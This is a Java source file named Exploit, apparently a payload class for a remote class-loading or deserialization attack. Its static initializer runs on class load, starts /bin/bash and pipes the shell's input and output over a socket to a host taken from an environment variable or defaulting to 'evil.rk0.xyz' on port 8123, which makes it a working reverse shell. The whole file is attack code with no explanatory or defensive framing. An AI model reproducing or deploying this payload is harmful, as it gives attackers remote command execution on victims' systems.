import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    static {
        try {
            new Exploit();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Exploit() throws Exception {
        String webShellHost = System.getenv("WEBSHELL_HOST");
        System.out.println("Hello World!!!");
        try {
            String shellCommand = "/bin/bash";
            Process process = new ProcessBuilder(shellCommand).redirectErrorStream(true).start();
            Socket socket = new Socket(webShellHost != null ? webShellHost : "evil.rk0.xyz", 8123);

            InputStream processInputStream = process.getInputStream();
            InputStream processErrorStream = process.getErrorStream();
            InputStream socketInputStream = socket.getInputStream();
            OutputStream processOutputStream = process.getOutputStream();
            OutputStream socketOutputStream = socket.getOutputStream();

            while (!socket.isClosed()) {
                while (processInputStream.available() > 0) {
                    socketOutputStream.write(processInputStream.read());
                }
                while (processErrorStream.available() > 0) {
                    socketOutputStream.write(processErrorStream.read());
                }
                while (socketInputStream.available() > 0) {
                    processOutputStream.write(socketInputStream.read());
                }

                socketOutputStream.flush();
                processOutputStream.flush();
                Thread.sleep(50);
                try {
                    process.exitValue();
                    break;
                } catch (Exception e) {
//                    System.out.println("???");
                }
            }
            process.destroy();
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
